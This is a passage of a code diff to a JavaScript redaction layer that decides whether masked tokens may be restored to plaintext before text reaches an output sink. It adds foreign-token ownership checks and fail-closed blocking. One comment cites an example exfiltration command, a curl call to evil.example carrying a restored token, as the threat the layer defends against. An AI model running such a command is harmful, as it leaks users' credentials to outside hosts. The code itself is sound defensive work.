@@ -104,36 +104,187 @@ export const RESTORE_ACTION = Object.freeze({
 });
 
 // A sink is trusted only when it is explicitly declared so (e.g. a local broker
-// that owns its own credential injection). Default deny: an undeclared sink is
-// untrusted, because the failure mode of guessing "trusted" is exfiltration.
+// that owns its own credential injection). Default deny: guessing "trusted" fails
+// open (exfiltration), guessing "untrusted" only leaves a token in place.
 function isTrustedSink(sink) {
   return sink?.trust === "trusted";
 }
 
-// Unknown entities are treated as credential-bearing. Guessing "not sensitive"
-// would restore a secret into an egress path; guessing "sensitive" at worst keeps
-// a token in place and records telemetry.
-function isCredentialEntity(entityClass) {
-  return entityClass === undefined || entityClass === null || entityClass === ENTITY_CLASS.CREDENTIAL;
+// ------------------------------------------------------------------ ownership ---
+
+export const TOKEN_OWNERSHIP = Object.freeze({
+  OWN: "OWN",
+  FOREIGN_REGISTERED: "FOREIGN_REGISTERED",
+  UNKNOWN: "UNKNOWN",
+});
+
+// THIS layer's dialect only. Used to decide whether an unknown string is
+// "protected-token-like" for the unknown-token branch of the restore policy.
+function isOwnDialectToken(value) {
+  return typeof value === "string"
+    && (PROTECTED_TOKEN_LIKE_RE.test(value) || LEGACY_TOKEN_RE.test(value));
 }
 
-export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" } }) {
+// A registered foreign namespace may legitimately use its OWN issuer-specific
+// shape (ACME_DLP_7f3a…), so eligibility cannot require our dialect. It must
+// still be token-shaped: uppercase/digits/underscore only, no separators that
+// appear in infrastructure identifiers. Hyphens, colons, dots and spaces are
+// excluded, which is what keeps `i-0a1b2c3d4e5f67890`,
+// `arn:aws:iam::123456789012:role/...`, UUIDs and release names out -- those can
+// never be claimed by a namespace matcher even if the config is over-broad.
+const FOREIGN_TOKEN_SHAPE_RE = /^[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+$/;
+
+function isRegisteredTokenLike(value) {
+  return typeof value === "string"
+    && (isOwnDialectToken(value) || FOREIGN_TOKEN_SHAPE_RE.test(value));
+}
+
+function normalizeForeignNamespace(pattern) {
+  if (pattern instanceof RegExp) return pattern;
+  if (pattern && typeof pattern === "object" && typeof pattern.pattern === "string") {
+    return new RegExp(pattern.pattern, pattern.flags || "");
+  }
+  if (typeof pattern === "string") return new RegExp(pattern);
+  // Must throw rather than stringify: `new RegExp(String(42))` silently yields a
+  // matcher for the literal "42", which is a config bug that looks like it works.
+  throw new TypeError("foreign namespace must be a RegExp or a pattern string");
+}
+
+// Namespaces are TRUSTED CONFIGURATION, not payload-derived data. A broad
+// "anything that looks like CRG_*" matcher would recreate the bypass this design
+// removed: whoever controls the payload could declare its own text foreign and
+// have it pass through unscanned. Prefer issuer-specific prefixes, or exact token
+// registration via tokens.
+export class ForeignTokenRegistry {
+  constructor(namespaces = []) {
+    this.namespaces = namespaces.map((entry) => (
+      typeof entry === "string"
+        ? { name: entry, matcher: normalizeForeignNamespace(entry) }
+        : { name: entry.name || String(entry.pattern), matcher: normalizeForeignNamespace(entry.pattern) }
+    ));
+    this.tokens = new Set();
+  }
+  registerTokens(tokens) {
+    for (const token of tokens) this.tokens.add(token);
+    return this;
+  }
+  /** @returns {string|null} the namespace name that claims this token, if any. */
+  namespaceOf(token) {
+    if (this.tokens.has(token)) return "exact";
+    for (const ns of this.namespaces) if (ns.matcher.test(token)) return ns.name;
+    return null;
+  }
+  has(token) { return this.namespaceOf(token) !== null; }
+  get size() { return this.namespaces.length + this.tokens.size; }
+}
+
+// "I do not know" and "I know it is a credential" are DIFFERENT states and must
+// stay distinguishable: telemetry and the future classifier both depend on the
+// difference. The default class is therefore UNKNOWN, and it is the POLICY that
+// treats UNKNOWN as credential-grade risk on a sensitive sink (fail-closed).
+//
+// Guessing "not sensitive" would restore a secret into an egress path; guessing
+// "sensitive" at worst keeps a token in place and records telemetry.
+export function isCredentialRisk(entityClass) {
+  return entityClass === undefined
+    || entityClass === null
+    || entityClass === ENTITY_CLASS.UNKNOWN
+    || entityClass === ENTITY_CLASS.CREDENTIAL;
+}
+
+export function classifyOwnership(token, ctx, registry = null) {
+  if (ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token)) {
+    return { ownership: TOKEN_OWNERSHIP.OWN, namespace: "own" };
+  }
+  if (registry) {
+    const namespace = registry.namespaceOf(token);
+    // Two ways to qualify, with different justifications:
+    //   - prefix namespace: the matcher claims it AND it is token-shaped. The
+    //     shape half keeps an over-broad matcher from declaring arbitrary text
+    //     foreign.
+    //   - exact registration: an explicit allowlist entry IS the trust decision,
+    //     so the shape check does not apply. This is the escape hatch for issuers
+    //     whose tokens have no predictable shape at all.
+    const exact = registry.tokens.has(token);
+    if (namespace && (exact || isRegisteredTokenLike(token))) {
+      return { ownership: TOKEN_OWNERSHIP.FOREIGN_REGISTERED, namespace };
+    }
+  }
+  return { ownership: TOKEN_OWNERSHIP.UNKNOWN, namespace: null };
+}
+
+export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" }, registry = null }) {
   if (typeof text !== "string") throw new TypeError("classifyRestore requires text");
   const sensitive = SENSITIVE_SINK_KINDS.includes(sink.kind);
   const trusted = isTrustedSink(sink);
   let known = 0;
   const unknownTokens = [];
 
+  // Foreign tokens do NOT match our dialect, so REDACTED_TOKEN cannot find them.
+  // They must be located through the registered namespaces themselves.
+  if (registry) {
+    for (const ns of registry.namespaces) {
+      ns.matcher.lastIndex = 0;
+      const found = text.match(ns.matcher);
+      if (!found) continue;
+      for (const candidate of found) {
+        if (registry.tokens.has(candidate)) continue; // exact entries are handled below
+        if (!isRegisteredTokenLike(candidate)) continue;
+        const { ownership } = classifyOwnership(candidate, ctx, registry);
+        if (ownership !== TOKEN_OWNERSHIP.FOREIGN_REGISTERED) continue;
+        if (sensitive && !trusted) {
+          return {
+            action: RESTORE_ACTION.BLOCK,
+            text,
+            blockedTokens: [candidate],
+            unknownTokens: [],
+            telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace: ns.name, ownership },
+          };
+        }
+      }
+    }
+    // Exact registrations that no prefix namespace covers.
+    for (const token of registry.tokens) {
+      if (!text.includes(token)) continue;
+      if (sensitive && !trusted) {
+        return {
+          action: RESTORE_ACTION.BLOCK,
+          text,
+          blockedTokens: [token],
+          unknownTokens: [],
+          telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace: "exact", ownership: TOKEN_OWNERSHIP.FOREIGN_REGISTERED },
+        };
+      }
+    }
+  }
+
   for (const token of text.match(REDACTED_TOKEN) || []) {
-    const owned = ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token);
-    if (owned) {
+    const { ownership, namespace } = classifyOwnership(token, ctx, registry);
+
+    if (ownership === TOKEN_OWNERSHIP.FOREIGN_REGISTERED) {
+      // This layer never restores a foreign token: it does not own the mapping.
+      // An outer DLP may restore it further down the chain. In a sensitive sink
+      // it must be blocked, because the outer layer may be exactly where the
+      // plaintext gets substituted before egress.
+      if (sensitive && !trusted) {
+        return {
+          action: RESTORE_ACTION.BLOCK,
+          text,
+          blockedTokens: [token],
+          unknownTokens: [],
+          telemetry: { event: "restore_blocked_foreign_sink", sink: sink.kind, namespace, ownership },
+        };
+      }
+      continue;
+    }
+
+    if (ownership === TOKEN_OWNERSHIP.OWN) {
       known += 1;
-      // A credential restored into an untrusted sensitive sink is an egress
-      // channel: the model can emit `curl https://evil.example/?x=<token>` and
-      // have this layer hand it the plaintext. Keep the token instead.
-      // The sink must ALSO be untrusted. A trusted broker (one that injects its
-      // own credentials locally) is the documented exception.
-      if (sensitive && !trusted && isCredentialEntity(ctx.entityClassFor?.(token))) {
+      // Ownership is necessary but not sufficient: a credential restored into an
+      // untrusted sensitive sink is an egress channel, because the model can emit
+      // `curl https://evil.example/?x=<token>` and have this layer hand over the
+      // plaintext.
+      if (sensitive && !trusted && isCredentialRisk(ctx.entityClassFor?.(token))) {
         return {
           action: RESTORE_ACTION.BLOCK,
           text,
@@ -149,6 +300,8 @@ export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" } }
       }
       continue;
     }
+
+    // UNKNOWN: a token-like string nobody claims.
     if (!isProtectedTokenLike(token)) continue;
     if (sensitive) {
       return {
